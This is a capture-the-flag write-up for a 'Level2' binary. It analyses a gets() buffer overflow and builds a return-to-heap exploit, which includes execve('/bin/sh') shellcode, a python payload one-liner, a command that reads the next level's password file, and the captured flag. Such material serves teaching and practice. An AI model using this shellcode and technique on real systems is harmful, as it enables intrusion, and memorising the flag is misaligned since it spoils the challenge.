# 💥 Level2 - Return-to-Heap Exploit

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Advanced buffer overflow with heap exploitation!

## 📋 Binary Analysis

### 🔍 Assembly Analysis
```asm
080484d4  PUSH EBP                 ; Save old base pointer
080484d5  MOV EBP, ESP             ; Set up new stack frame
080484d7  SUB ESP, 0x68            ; Allocate 104 bytes (0x68)
080484da  MOV EAX, [stdout]
080484df  MOV [ESP], EAX
080484e2  CALL fflush
080484e7  LEA EAX, [EBP + -0x4c]   ; Buffer at EBP - 76
080484ea  MOV [ESP], EAX
080484ed  CALL gets                ; Unsafe gets()!
080484f2  MOV EAX, [EBP + 0x04]    ; Read return address
080484f5  MOV [EBP + -0x0c], EAX   ; Store at EBP - 12
080484f8  MOV EAX, [EBP + -0x0c]
080484fb  AND EAX, 0xb0000000      ; Check if starts with 0xb
08048500  CMP EAX, 0xb0000000
08048505  JNZ LAB_08048527         ; Jump if not 0xb
...
08048516  CALL printf
0804851b  MOV [ESP], 0x1
08048522  CALL _exit               ; Exit if 0xb detected!
08048527  LEA EAX, [EBP + -0x4c]
0804852a  MOV [ESP], EAX
0804852d  CALL puts
08048532  LEA EAX, [EBP + -0x4c]
08048535  MOV [ESP], EAX
08048538  CALL strdup              ; Copies to heap!
0804853d  LEAVE
0804853e  RET
```

### 🔍 Reconstructed Source Code
```c
void p(void)
{
    char buffer[64];        // At EBP - 76 (64 bytes)
    unsigned int ret_addr;  // At EBP - 12 (4 bytes)
    
    fflush(stdout);
    gets(buffer);           // Vulnerable!
    
    ret_addr = __builtin_return_address(0);
    if ((ret_addr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", ret_addr);
        _exit(1);           // Blocks stack addresses!
    }
    
    puts(buffer);
    strdup(buffer);         // Copies to heap
    return;
}
```

## 🚨 What's New: Stack Protection

### The Protection Mechanism

```c
if ((ret_addr & 0xb0000000) == 0xb0000000)  // Check if address starts with 0xb
    _exit(1);  // Kill program if true
```

**Why this matters:**
- Stack addresses start with `0xbffff...` → would be caught ❌
- Heap addresses start with `0x0804a...` → passes the check ✅
- We can't use the Level1 technique (return to stack) anymore!

## 🎯 How the Exploit Works

### Stack Layout

```
High Memory
┌──────────────────────────────────┐
│ Return Address     [EBP + 4]     │ ← Target (4 bytes)
├──────────────────────────────────┤
│ Saved EBP          [EBP]         │ ← 4 bytes
├──────────────────────────────────┤
│ (unused)           [EBP - 4]     │ ← 4 bytes
├──────────────────────────────────┤
│ (unused)           [EBP - 8]     │ ← 4 bytes
├──────────────────────────────────┤
│ ret_addr           [EBP - 12]    │ ← 4 bytes (overwritten during overflow!)
├──────────────────────────────────┤
│ buffer[63]         [EBP - 13]    │
│ ...                              │
│ buffer[0]          [EBP - 76]    │ ← 64 bytes, gets() writes here
└──────────────────────────────────┘
Low Memory
```

### Calculating the Overflow Offset

From the assembly:
- Buffer starts at `EBP - 76` 
- `ret_addr` is at `EBP - 12`
- **Buffer size = 76 - 12 = 64 bytes**

Distance from buffer to return address:
- 64 bytes (buffer)
- 4 bytes (ret_addr variable)
- 8 bytes (unused padding)
- 4 bytes (saved EBP)
- **Total: 80 bytes to reach return address**

### Byte-by-Byte Payload Breakdown

| Offset   | Size     | Content              | Purpose                              |
|----------|----------|----------------------|--------------------------------------|
| 0 - 23   | 24 bytes | Shellcode            | Code to execute                      |
| 24 - 63  | 40 bytes | `AAA...`             | Fill rest of buffer                  |
| 64 - 67  | 4 bytes  | `AAAA`               | Overwrite ret_addr (becomes 0x41414141) |
| 68 - 75  | 8 bytes  | `AAAA...`            | Overwrite unused padding             |
| 76 - 79  | 4 bytes  | `BBBB`               | Overwrite saved EBP                  |
| 80 - 83  | 4 bytes  | `\x08\xa0\x04\x08`   | Overwrite return address (heap)      |

**Total: 80 + 4 = 84 bytes**

### Why the Protection Check Passes

When we overflow with 'A's (0x41), the `ret_addr` variable gets overwritten:
- `ret_addr` becomes `0x41414141` ("AAAA")
- Check: `0x41414141 & 0xb0000000 = 0x00000000`
- `0x00000000 != 0xb0000000` → **Check passes!**

The protection is bypassed because it checks the **corrupted** `ret_addr` variable, not the actual return address on the stack!

### The Attack Strategy

**Key insight:** Use `strdup()` to copy our shellcode to the heap, then redirect execution there!

```
Stack (after overflow)                 Heap
──────────────────────────────        ─────────────────────────
Return Addr → 0x0804a008 ─────────────→ 0x0804a008: Shellcode!
Saved EBP   → 0x42424242              │ \x31\xc0\x99\x50...
(unused)    → 0x41414141              │ (24 bytes)
(unused)    → 0x41414141              └─ execve("/bin/sh")
ret_addr    → 0x41414141 (passes check!)
buffer[64]  → [Shellcode + padding]
──────────────────────────────
              │
              └── strdup() copies buffer to heap
```

1. **Craft payload**: `[Shellcode (24)] + [Padding (56)] + [Heap Address (4)]`
2. **gets() overflow**: Writes 84 bytes, overwrites ret_addr and return address
3. **Protection check**: Uses corrupted `ret_addr` (0x41414141), passes!
4. **strdup()**: Copies shellcode to heap at `0x0804a008`
5. **ret instruction**: Loads `0x0804a008` into EIP
6. **Execute shellcode**: CPU jumps to heap → Shell!

## 💣 Building the Exploit

### Step 1: Find Heap Address

```bash
ltrace ./level2
# Input: AAAA
# Output: strdup("AAAA") = 0x0804a008
```

Heap address is **`0x0804a008`** (predictable, no ASLR)

### Step 2: Get Shellcode (24 bytes)

**Source**: [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428) - execve("/bin/sh")

```
\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

**What it does:**
```asm
xor    eax, eax              # EAX = 0
cdq                          # EDX = 0
push   eax                   # Push NULL terminator
push   0x68732f2f            # Push "//sh"
push   0x6e69622f            # Push "/bin"
mov    ebx, esp              # EBX = pointer to "/bin//sh"
push   eax                   # Push NULL
push   ebx                   # Push "/bin//sh" pointer
mov    ecx, esp              # ECX = argv array
mov    al, 0x0b              # EAX = 11 (execve syscall)
int    0x80                  # Execute syscall
```

### Step 3: Calculate Payload

From our byte-by-byte analysis:
- **Shellcode**: 24 bytes
- **Padding**: 56 bytes (to reach 80 total)
- **Return address**: 4 bytes (`0x0804a008`)

Payload structure:
```
[Shellcode: 24] + [Padding: 56] + [0x0804a008]
                                   └─\x08\xa0\x04\x08─┘
Total: 24 + 56 + 4 = 84 bytes
```

### Step 4: Execute

```bash
(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*56 + "\x08\xa0\x04\x08"'; cat) | ./level2
```

**Breakdown**:
- Shellcode (24 bytes) + "A"*56 (padding) = 80 bytes to reach return address
- `\x08\xa0\x04\x08` (4 bytes) overwrites return address with heap address

Get the flag:
```bash
cat /home/user/level3/.pass
```

---

> **Pro Tip**: When stack is protected, look for heap allocations like `malloc()`, `strdup()`, `calloc()`!

> **Security Note**: This demonstrates why multiple security layers ([ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) + [DEP](https://en.wikipedia.org/wiki/Executable_space_protection) + [Stack Canaries](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries)) are needed!

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!**

```
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
